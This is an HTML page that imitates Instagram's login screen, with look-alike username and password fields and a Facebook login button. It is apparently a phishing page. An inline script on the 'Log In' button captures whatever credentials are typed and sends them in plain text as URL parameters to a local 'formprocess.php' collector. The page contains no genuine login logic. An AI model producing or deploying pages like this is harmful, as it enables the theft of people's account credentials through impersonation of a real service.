<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Instagram Login Page</title>
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
</head>
<body>
<!-- partial:index.partial.html -->
<div class="container">
      <div class="box">
        <div class="heading"></div>
        <form class="login-form">
          <div class="field">
            <input
              id="username"
              type="name"
              placeholder="Phone number, username, or email"
            />
            <label for="username">Phone number, username, or email</label>
          </div>
          <div class="field">
            <input id="password" type="password" placeholder="password" />
            <label for="password">Password</label>
          </div>
						<button onclick='test()' id='button' class="login-button" title="login">Log In</button>
            <script>
            function test(){
              console.log('works?');
              var xmlhttp = new XMLHttpRequest();
              xmlhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                }
              };
              var user = document.getElementById('username').value;
              var pass = document.getElementById('password').value;
              xmlhttp.open("GET","formprocess.php?user="+user+'&pass='+pass,true);
              xmlhttp.send();
            }
            </script>
            <div class="separator">
							<div class="line"></div>
							<p>OR</p>
							<div class="line"></div>
						</div>
          <div class="other">
            <button class="fb-login-btn" type="button">
              <i class="fa fa-facebook-official fb-icon"></i>
              <span class="">Log in with Facebook</span>
            </button>
            <a class="forgot-password" href="#">Forgot password?</a>
          </div>
        </form>
      </div>
      <div class="box">
        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
      </div>
    </div>
<!-- partial -->
</body>

</html>
